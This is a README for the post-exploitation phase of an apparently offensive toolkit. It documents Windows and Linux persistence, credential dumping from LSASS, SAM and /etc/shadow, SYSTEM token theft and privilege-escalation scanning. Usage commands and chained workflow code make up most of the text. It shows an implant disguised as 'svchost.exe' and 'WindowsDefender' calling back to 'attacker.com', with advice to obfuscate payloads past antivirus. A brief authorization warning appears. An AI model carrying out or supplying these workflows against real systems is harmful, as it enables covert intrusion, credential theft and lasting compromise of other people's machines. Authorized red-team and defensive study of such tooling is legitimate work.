# Phase 3: Persistence & Privilege Escalation

## Overview

Phase 3 implements post-exploitation techniques for maintaining access and elevating privileges on compromised systems. This phase includes both Windows and Linux persistence mechanisms, automated privilege escalation enumeration, credential dumping, and token manipulation.

## Architecture

```
Phase 3 Components:
├── Persistence
│   ├── Windows Persistence (Registry, Tasks, Services, WMI)
│   ├── Linux Persistence (Cron, Systemd, SSH, Profile)
│   └── Token Manipulation (Windows)
├── Privilege Escalation
│   ├── Enumeration (Windows & Linux)
│   ├── Credential Dumping (LSASS, SAM, Shadow)
│   └── Automated Scanner
└── Integration with C2 Framework
```

## Modules

### 1. Windows Persistence (`persistence/windows_persist.py`)

Comprehensive Windows persistence mechanisms.

**Techniques:**
- Registry Run keys (HKCU/HKLM)
- Scheduled tasks
- Windows services
- Startup folder
- WMI event subscriptions
- PowerShell profile modification
- LNK file creation

**Usage:**

```bash
# Registry persistence
python persistence/windows_persist.py C:\implant.exe --registry

# Scheduled task
python persistence/windows_persist.py C:\implant.exe --task

# Service creation
python persistence/windows_persist.py C:\implant.exe --service

# All methods
python persistence/windows_persist.py C:\implant.exe --all

# Cleanup
python persistence/windows_persist.py C:\implant.exe --cleanup
```

**Python API:**

```python
from persistence.windows_persist import WindowsPersistence

persist = WindowsPersistence('C:\\implant.exe', name='WindowsUpdate')

# Registry Run key
persist.registry_run_key(location='HKCU_Run')

# Scheduled task (runs on logon)
persist.scheduled_task(trigger='ONLOGON', run_level='HIGHEST')

# Create Windows service
persist.service_persistence(start_type='auto')

# Startup folder
persist.startup_folder(all_users=False)

# WMI event subscription
persist.wmi_event_subscription()

# PowerShell profile persistence
payload = "Start-Process C:\\implant.exe -WindowStyle Hidden"
persist.powershell_profile_persistence(payload)

# Generate report
print(persist.generate_report())

# Cleanup all persistence
persist.cleanup_persistence()
```

### 2. Linux Persistence (`persistence/linux_persist.py`)

Comprehensive Linux/Unix persistence mechanisms.

**Techniques:**
- Cron jobs (@reboot, scheduled)
- Systemd services
- Bashrc/profile modifications
- Profile.d scripts
- SSH authorized_keys
- MOTD backdoors
- At jobs
- rc.local
- XDG autostart

**Usage:**

```bash
# Cron job (@reboot)
python persistence/linux_persist.py /tmp/implant.sh --cron

# Systemd service
python persistence/linux_persist.py /tmp/implant.sh --systemd

# Bashrc persistence
python persistence/linux_persist.py /tmp/implant.sh --bashrc

# SSH key persistence
python persistence/linux_persist.py --ssh-key "ssh-rsa AAAAB3..."

# All methods
python persistence/linux_persist.py /tmp/implant.sh --all

# Cleanup
python persistence/linux_persist.py --cleanup
```

**Python API:**

```python
from persistence.linux_persist import LinuxPersistence

persist = LinuxPersistence('/tmp/implant.sh', name='system-update')

# Cron job (runs on reboot)
persist.cron_job(schedule='@reboot')

# Systemd service
persist.systemd_service(description='System Update Service', user='root')

# Bashrc persistence
persist.bashrc_persistence('/tmp/implant.sh &', global_bashrc=False)

# Profile.d script
persist.profile_d_script('update.sh')

# SSH key backdoor
public_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQA..."
persist.ssh_authorized_keys(public_key)

# MOTD backdoor
persist.motd_backdoor()

# rc.local
persist.rc_local()

# Generate report
print(persist.generate_report())

# Cleanup
persist.cleanup_persistence()
```

### 3. Privilege Escalation (`persistence/privilege_escalation.py`)

Automated privilege escalation enumeration for Windows and Linux.

**Detects:**

**Windows:**
- Dangerous privileges (SeImpersonatePrivilege, SeDebugPrivilege, etc.)
- Unquoted service paths
- Weak service permissions
- AlwaysInstallElevated
- Modifiable scheduled tasks
- Autologon credentials

**Linux:**
- SUID binaries (especially GTFOBins candidates)
- Sudo permissions (NOPASSWD, dangerous commands)
- Writable /etc/passwd
- Modifiable cron jobs
- Kernel exploits
- Dangerous capabilities

**Usage:**

```bash
# Run enumeration
python persistence/privilege_escalation.py

# Export results to JSON
python persistence/privilege_escalation.py --export privesc.json

# Verbose output
python persistence/privilege_escalation.py --verbose
```

**Python API:**

```python
from persistence.privilege_escalation import PrivilegeEscalation

privesc = PrivilegeEscalation()

# Enumerate all vectors
vectors = privesc.enumerate()

# Filter by severity
critical = [v for v in vectors if v.severity == 'critical']
high = [v for v in vectors if v.severity == 'high']

# Generate report
print(privesc.generate_report())

# Export to JSON
privesc.export_json('privesc_results.json')

# Access individual vectors
for vector in vectors:
    print(f"{vector.vector_type}: {vector.description}")
    if vector.file_path:
        print(f"  Path: {vector.file_path}")
```

### 4. Credential Dumping (`persistence/credential_dumping.py`)

Extract credentials from Windows and Linux systems.

**Windows:**
- LSASS memory dumps
- SAM database extraction
- Registry credentials (autologon, VNC)
- Credential Manager
- WiFi passwords

**Linux:**
- /etc/shadow extraction
- SSH private keys
- Bash history passwords
- Configuration file credentials
- Database credentials

**Usage:**

```bash
# Dump all credentials
python persistence/credential_dumping.py

# Export to JSON
python persistence/credential_dumping.py --export creds.json

# Export to CSV
python persistence/credential_dumping.py --export creds.csv --format csv

# Export hashes for hashcat
python persistence/credential_dumping.py --export hashes.txt --format hashcat
```

**Python API:**

```python
from persistence.credential_dumping import CredentialDumper

dumper = CredentialDumper()

# Dump all credentials
credentials = dumper.dump_all()

# Filter by type
hashes = [c for c in credentials if c.credential_type == 'hash']
passwords = [c for c in credentials if c.credential_type == 'password']

# Generate report
print(dumper.generate_report())

# Export
dumper.export_credentials('credentials.json', format='json')
dumper.export_credentials('hashes.txt', format='hashcat')
```

### 5. Token Manipulation (`persistence/token_manipulation.py`)

Windows token manipulation and impersonation (Windows only).

**Features:**
- Token stealing from processes
- Token duplication
- Token impersonation
- Privilege enabling (SeDebugPrivilege, etc.)
- SYSTEM token theft
- Process creation with stolen tokens

**Usage:**

```bash
# List current privileges
python persistence/token_manipulation.py --list-privileges

# Enable SeDebugPrivilege
python persistence/token_manipulation.py --enable-privilege SeDebugPrivilege

# Steal SYSTEM token
python persistence/token_manipulation.py --steal-system

# Impersonate specific process
python persistence/token_manipulation.py --impersonate-pid 1234

# Spawn cmd with SYSTEM token
python persistence/token_manipulation.py --steal-system --spawn-cmd
```

**Python API:**

```python
from persistence.token_manipulation import TokenManipulation

token_manip = TokenManipulation()

# Enable SeDebugPrivilege
token_manip.enable_privilege('SeDebugPrivilege')

# Steal SYSTEM token
h_system_token = token_manip.steal_system_token()

if h_system_token:
    # Create cmd.exe as SYSTEM
    token_manip.create_process_with_token(h_system_token, "cmd.exe")

    # Or impersonate
    token_manip.impersonate_token(h_system_token)

    # Do elevated actions...

    # Revert
    token_manip.revert_to_self()

# Cleanup
token_manip.cleanup()
```

### 6. Automated Scanner (`persistence/automated_scanner.py`)

Comprehensive automated post-exploitation scanner.

**Features:**
- Automated privilege escalation enumeration
- Credential dumping (aggressive mode)
- Result analysis and recommendations
- Comprehensive reporting
- JSON export

**Usage:**

```bash
# Basic scan (privesc enumeration only)
python persistence/automated_scanner.py

# Aggressive scan (includes credential dumping)
python persistence/automated_scanner.py --aggressive

# Brief report
python persistence/automated_scanner.py --aggressive --brief

# Export results
python persistence/automated_scanner.py --aggressive --export results.json
```

**Python API:**

```python
from persistence.automated_scanner import AutomatedScanner

scanner = AutomatedScanner(aggressive=True)

# Run full scan
results = scanner.run_full_scan()

# Generate report
print(scanner.generate_report(include_full_details=True))

# Export results
scanner.export_results('scan_results.json')

# Access specific results
print(f"Privesc vectors found: {results['privesc_vectors']}")
print(f"Credentials found: {results['credentials_found']}")

# Get recommendations
for rec in results.get('recommendations', []):
    print(f"[{rec['priority']}] {rec['action']}")
```

## Complete Workflows

### Workflow 1: Windows Post-Exploitation

```python
from persistence.privilege_escalation import PrivilegeEscalation
from persistence.credential_dumping import CredentialDumper
from persistence.token_manipulation import TokenManipulation
from persistence.windows_persist import WindowsPersistence

# Step 1: Enumerate privilege escalation vectors
privesc = PrivilegeEscalation()
vectors = privesc.enumerate()

print(f"[+] Found {len(vectors)} privesc vectors")

# Step 2: Attempt token manipulation if we have SeImpersonatePrivilege
token_manip = TokenManipulation()
token_manip.enable_privilege('SeDebugPrivilege')
h_system_token = token_manip.steal_system_token()

if h_system_token:
    print("[+] Obtained SYSTEM token!")

    # Step 3: Dump credentials as SYSTEM
    dumper = CredentialDumper()
    creds = dumper.dump_all()
    dumper.export_credentials('credentials.json')

    # Step 4: Establish persistence as SYSTEM
    persist = WindowsPersistence('C:\\Windows\\Temp\\implant.exe')
    persist.registry_run_key('HKLM_Run')
    persist.scheduled_task(run_level='HIGHEST')
    persist.service_persistence()

    print(persist.generate_report())
```

### Workflow 2: Linux Post-Exploitation

```python
from persistence.privilege_escalation import PrivilegeEscalation
from persistence.credential_dumping import CredentialDumper
from persistence.linux_persist import LinuxPersistence

# Step 1: Enumerate privesc vectors
privesc = PrivilegeEscalation()
vectors = privesc.enumerate()

# Check for easy wins
suid_vectors = [v for v in vectors if v.vector_type == 'suid_binary']
sudo_vectors = [v for v in vectors if 'sudo' in v.vector_type]

print(f"[+] SUID binaries: {len(suid_vectors)}")
print(f"[+] Sudo vectors: {len(sudo_vectors)}")

# Step 2: Dump credentials
dumper = CredentialDumper()
creds = dumper.dump_all()

# Export hashes for cracking
dumper.export_credentials('shadow_hashes.txt', format='hashcat')

# Step 3: Establish persistence
persist = LinuxPersistence('/tmp/.update', name='system-check')

# Multiple persistence mechanisms
persist.cron_job(schedule='@reboot')
persist.bashrc_persistence('/tmp/.update &', global_bashrc=True)

# SSH key backdoor
persist.ssh_authorized_keys("ssh-rsa AAAAB3...")

persist.systemd_service(user='root')

print(persist.generate_report())
```

### Workflow 3: Automated Post-Exploitation

```python
from persistence.automated_scanner import AutomatedScanner

# Run comprehensive automated scan
scanner = AutomatedScanner(aggressive=True)

# Execute full scan
results = scanner.run_full_scan()

# Display results
print(scanner.generate_report())

# Export for later analysis
scanner.export_results('posture_assessment.json')

# Follow recommendations
for rec in results['recommendations']:
    if rec['priority'] == 'CRITICAL':
        print(f"\n[!] CRITICAL: {rec['action']}")
        print(f"    {rec['details']}")
```

## Integration with C2 Framework

Integrate persistence with Phase 1 C2 framework:

```python
from persistence.windows_persist import WindowsPersistence
from c2.implant.basic_implant import Implant

# Deploy implant with persistence
implant_path = 'C:\\Windows\\Temp\\svchost.exe'

# Establish persistence
persist = WindowsPersistence(implant_path, name='WindowsDefender')
persist.registry_run_key('HKCU_Run')
persist.scheduled_task(trigger='ONLOGON')

# Start implant
implant = Implant(c2_url='http://attacker.com:8443')
implant.start()

# Implant now persists across reboots
```

## Security Considerations

**CRITICAL WARNINGS:**

1. **Authorization Required**: Only use on systems you own or have explicit written permission to test
2. **Credential Dumping**: Extremely invasive and will trigger security alerts
3. **Token Manipulation**: Requires administrative privileges and may crash processes
4. **Persistence**: Creates artifacts that forensic analysis will detect
5. **Legal Implications**: Unauthorized use is illegal in most jurisdictions

**Best Practices:**

- Always obtain written authorization before testing
- Use in isolated lab environments for learning
- Document all actions for legitimate penetration tests
- Clean up all persistence mechanisms after testing
- Report findings responsibly
- Respect scope limitations

## Troubleshooting

### Windows Issues

**LSASS Dump Fails:**
- Requires administrative privileges
- May be blocked by AV/EDR
- Try alternative methods (comsvcs.dll, process dump tools)

**Token Manipulation Fails:**
- Requires SeDebugPrivilege
- Target process may be protected (PPL)
- Use `--enable-privilege SeDebugPrivilege` first

**Persistence Removed:**
- Check if AV is removing artifacts
- Use obfuscation for persistence payloads
- Multiple persistence methods increase chances

### Linux Issues

**Permission Denied:**
- Many techniques require root access
- Enumerate for privesc vectors first
- Some techniques work as regular user (cron, bashrc)

**Systemd Service Fails:**
- Check service file syntax
- Verify ExecStart path is correct
- Check systemd logs: `journalctl -xe`

## Testing

Run Phase 3 tests:

```bash
# Run privilege escalation tests
pytest tests/test_privilege_escalation.py -v

# Run all Phase 3 tests
pytest tests/test_privilege_escalation.py -v
```

## Next Steps

After Phase 3:
1. Verify all persistence mechanisms
2. Test privilege escalation vectors
3. Crack harvested credentials
4. Proceed to Phase 4: Lateral Movement
5. Document findings

## Additional Resources

- [GTFOBins](https://gtfobins.github.io/) - Unix binaries for privilege escalation
- [LOLBAS](https://lolbas-project.github.io/) - Living Off The Land Binaries (Windows)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [MITRE ATT&CK - Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
- [MITRE ATT&CK - Persistence](https://attack.mitre.org/tactics/TA0003/)
